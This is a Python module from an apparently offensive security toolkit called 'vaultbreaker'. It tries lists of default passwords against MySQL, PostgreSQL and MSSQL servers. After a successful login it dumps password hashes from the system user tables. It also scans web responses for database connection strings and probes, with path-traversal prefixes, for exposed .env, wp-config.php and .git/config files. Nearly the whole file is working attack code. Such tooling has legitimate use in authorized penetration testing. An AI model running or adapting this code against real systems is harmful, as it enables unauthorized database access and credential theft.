"""Database credential extraction -- default creds, hash dumping, connection string scanning."""
from __future__ import annotations

import re
import urllib.parse
from typing import Optional

from vaultbreaker.models import AttackResult, Credential, EngagementContext
from vaultbreaker.logger import info, ok, warn, crit, section, console
from vaultbreaker.modules.base import BaseModule
from vaultbreaker.data import http_request


class CredExtractModule(BaseModule):
    """Database credential extraction -- default creds, hash dumping, connection string scanning."""

    name = "cred"

    MYSQL_DEFAULTS = [
        ("root", "root"), ("root", "mysql"), ("root", "password"),
        ("root", ""), ("admin", "admin"), ("mysql", "mysql"),
        ("root", "toor"), ("root", "123456"), ("dbadmin", "dbadmin"),
    ]

    POSTGRES_DEFAULTS = [
        ("postgres", "postgres"), ("postgres", "password"), ("admin", "admin"),
        ("postgres", ""), ("postgres", "123456"), ("pgsql", "pgsql"),
    ]

    MSSQL_DEFAULTS = [
        ("sa", "sa"), ("sa", "password"), ("sa", ""),
        ("sa", "Password1"), ("sa", "sa123"), ("sa", "123456"),
    ]

    CONN_STRING_PATTERNS = [
        r"jdbc:mysql://[\w\.\-]+(?::\d+)?/\w+",
        r"jdbc:postgresql://[\w\.\-]+(?::\d+)?/\w+",
        r"jdbc:sqlserver://[\w\.\-]+(?::\d+)?",
        r"mongodb://[\w\.\-:@]+(?:/\w+)?",
        r"redis://[\w\.\-:@]+(?:/\d+)?",
        r"postgresql://[\w\.\-:@]+(?:/\w+)?",
        r"mysql://[\w\.\-:@]+(?:/\w+)?",
        r"Server=[\w\.\-]+;.*(?:Password|Pwd)=\w+",
        r"Data Source=[\w\.\-]+;.*(?:Password|Pwd)=\w+",
    ]

    CRED_FILE_PATHS = [
        "/var/www/.env", "/var/www/html/.env", "/var/www/html/wp-config.php",
        "/opt/*/config.*", "/etc/*/database.*", "/var/www/html/configuration.php",
        "/var/www/html/config/database.php", "/var/www/html/app/config/parameters.yml",
        "/var/www/html/.git/config", "/home/*/.my.cnf", "/home/*/.pgpass",
        "/root/.my.cnf", "/root/.pgpass",
    ]

    def run(self, ctx: EngagementContext) -> None:
        section("Credential Extraction Module")
        for target in ctx.targets:
            host = target.split("://")[-1].split("/")[0].split(":")[0]
            info(f"Target: {host}")
            if ctx.db_type in ("auto", "mysql"):
                self._mysql_defaults(ctx, host)
            if ctx.db_type in ("auto", "postgres"):
                self._postgres_defaults(ctx, host)
            if ctx.db_type in ("auto", "mssql"):
                self._mssql_defaults(ctx, host)
            if target.startswith("http"):
                self._connection_string_scan(ctx, target)
            self._cred_file_scan(ctx, target)

    def _mysql_defaults(self, ctx: EngagementContext, host: str):
        port = 3306
        for p in ctx.ports:
            if p in (3306, 3307):
                port = p
                break
        try:
            import mysql.connector
            for user, pwd in self.MYSQL_DEFAULTS:
                try:
                    conn = mysql.connector.connect(
                        host=host, port=port, user=user, password=pwd,
                        connection_timeout=ctx.timeout
                    )
                    ctx.add_result(AttackResult(
                        "cred", "MySQL Default Creds", "critical", "critical",
                        f"Login successful: {user}:{pwd}@{host}:{port}"
                    ))
                    ctx.add_credential(Credential("mysql-default", user, pwd, "", host, port))
                    try:
                        cursor = conn.cursor()
                        cursor.execute(
                            "SELECT user, host, authentication_string FROM mysql.user"
                        )
                        rows = cursor.fetchall()
                        for row in rows:
                            hash_val = row[2] if len(row) > 2 else ""
                            hash_preview = str(hash_val)[:40] + "..." if len(str(hash_val)) > 40 else str(hash_val)
                            ctx.add_result(AttackResult(
                                "cred", "MySQL Hash Extraction", "ok", "critical",
                                f"{row[0]}@{row[1]} hash={hash_preview}"
                            ))
                            if hash_val and str(hash_val).startswith("*"):
                                ctx.add_result(AttackResult(
                                    "cred", "Hash Format", "ok", "medium",
                                    f"{row[0]}: MySQL 4.1+ (SHA1) hash detected"
                                ))
                        cursor.close()
                    except Exception as e:
                        ctx.add_result(AttackResult("cred", "MySQL Hash Extraction", "fail", "low",
                                                    f"Cannot read mysql.user: {e}"))
                    conn.close()
                    return
                except mysql.connector.Error:
                    continue
            ctx.add_result(AttackResult("cred", "MySQL Default Creds", "fail", "info",
                                        f"No default credentials worked on {host}:{port}"))
        except ImportError:
            ctx.add_result(AttackResult("cred", "MySQL Default Creds", "fail", "info",
                                        "mysql-connector-python not installed"))

    def _postgres_defaults(self, ctx: EngagementContext, host: str):
        port = 5432
        for p in ctx.ports:
            if p in (5432, 5433):
                port = p
                break
        try:
            import psycopg2
            for user, pwd in self.POSTGRES_DEFAULTS:
                try:
                    conn = psycopg2.connect(
                        host=host, port=port, user=user, password=pwd,
                        connect_timeout=ctx.timeout, dbname="postgres"
                    )
                    ctx.add_result(AttackResult(
                        "cred", "PostgreSQL Default Creds", "critical", "critical",
                        f"Login successful: {user}:{pwd}@{host}:{port}"
                    ))
                    ctx.add_credential(Credential("postgres-default", user, pwd, "postgres", host, port))
                    try:
                        cursor = conn.cursor()
                        cursor.execute("SELECT usename, passwd FROM pg_shadow")
                        rows = cursor.fetchall()
                        for row in rows:
                            hash_val = row[1] if len(row) > 1 else ""
                            hash_preview = str(hash_val)[:40] if hash_val else "N/A"
                            ctx.add_result(AttackResult(
                                "cred", "PostgreSQL Hash Extraction", "ok", "critical",
                                f"{row[0]} hash={hash_preview}"
                            ))
                            if hash_val and str(hash_val).startswith("md5"):
                                ctx.add_result(AttackResult(
                                    "cred", "Hash Format", "ok", "medium",
                                    f"{row[0]}: PostgreSQL MD5 hash detected"
                                ))
                        cursor.close()
                    except Exception as e:
                        ctx.add_result(AttackResult("cred", "PostgreSQL Hash Extraction", "fail", "low",
                                                    f"Cannot read pg_shadow: {e}"))
                    conn.close()
                    return
                except psycopg2.OperationalError:
                    continue
            ctx.add_result(AttackResult("cred", "PostgreSQL Default Creds", "fail", "info",
                                        f"No default credentials worked on {host}:{port}"))
        except ImportError:
            ctx.add_result(AttackResult("cred", "PostgreSQL Default Creds", "fail", "info",
                                        "psycopg2 not installed"))

    def _mssql_defaults(self, ctx: EngagementContext, host: str):
        port = 1433
        for p in ctx.ports:
            if p in (1433, 1434):
                port = p
                break
        try:
            import pymssql
            for user, pwd in self.MSSQL_DEFAULTS:
                try:
                    conn = pymssql.connect(
                        server=host, port=str(port), user=user, password=pwd,
                        login_timeout=ctx.timeout
                    )
                    ctx.add_result(AttackResult(
                        "cred", "MSSQL Default Creds", "critical", "critical",
                        f"Login successful: {user}:{pwd}@{host}:{port}"
                    ))
                    ctx.add_credential(Credential("mssql-default", user, pwd, "master", host, port))
                    try:
                        cursor = conn.cursor()
                        cursor.execute("SELECT name, password_hash FROM sys.sql_logins")
                        rows = cursor.fetchall()
                        for row in rows:
                            hash_val = row[1] if len(row) > 1 else b""
                            if isinstance(hash_val, bytes):
                                hash_hex = hash_val.hex()[:40] + "..."
                            else:
                                hash_hex = str(hash_val)[:40]
                            ctx.add_result(AttackResult(
                                "cred", "MSSQL Hash Extraction", "ok", "critical",
                                f"{row[0]} hash=0x{hash_hex}"
                            ))
                        cursor.close()
                    except Exception as e:
                        ctx.add_result(AttackResult("cred", "MSSQL Hash Extraction", "fail", "low",
                                                    f"Cannot read sys.sql_logins: {e}"))
                    conn.close()
                    return
                except pymssql.OperationalError:
                    continue
                except pymssql.InterfaceError:
                    continue
            ctx.add_result(AttackResult("cred", "MSSQL Default Creds", "fail", "info",
                                        f"No default credentials worked on {host}:{port}"))
        except ImportError:
            ctx.add_result(AttackResult("cred", "MSSQL Default Creds", "fail", "info",
                                        "pymssql not installed"))

    def _connection_string_scan(self, ctx: EngagementContext, url: str):
        resp = http_request(url, timeout=ctx.timeout)
        if not resp or not resp.text:
            return
        body = resp.text
        found = []
        for pattern in self.CONN_STRING_PATTERNS:
            matches = re.findall(pattern, body, re.IGNORECASE)
            found.extend(matches)
        if found:
            for conn_str in found[:10]:
                ctx.add_result(AttackResult(
                    "cred", "Connection String Found", "critical", "critical",
                    f"Exposed connection string: {conn_str[:100]}"
                ))
        else:
            ctx.add_result(AttackResult("cred", "Connection String Scan", "ok", "info",
                                        "No connection strings found in response"))

    def _cred_file_scan(self, ctx: EngagementContext, target: str):
        if not target.startswith("http"):
            return
        parsed = urllib.parse.urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        traversal_prefixes = ["", "../", "../../", "../../../"]
        test_files = [".env", "wp-config.php", "configuration.php",
                      "config/database.php", ".git/config", "web.config"]
        found_any = False
        for prefix in traversal_prefixes:
            for fname in test_files:
                test_url = f"{base}/{prefix}{fname}"
                resp = http_request(test_url, timeout=ctx.timeout)
                if resp and resp.status_code == 200 and len(resp.text or "") > 20:
                    body = resp.text
                    cred_indicators = [
                        "DB_PASSWORD", "DB_HOST", "database_password", "mysql",
                        "postgres", "password", "SQLSERVER", "mongodb",
                    ]
                    if any(ind.lower() in body.lower() for ind in cred_indicators):
                        ctx.add_result(AttackResult(
                            "cred", "Credential File Exposed", "critical", "critical",
                            f"Config file accessible: {test_url}"
                        ))
                        for pattern in self.CONN_STRING_PATTERNS:
                            matches = re.findall(pattern, body, re.IGNORECASE)
                            for m in matches[:5]:
                                ctx.add_result(AttackResult(
                                    "cred", "Credential in Config", "ok", "critical",
                                    f"Extracted: {m[:100]}"
                                ))
                        found_any = True
        if not found_any:
            ctx.add_result(AttackResult("cred", "Credential File Scan", "ok", "info",
                                        "No exposed config files found via common paths"))
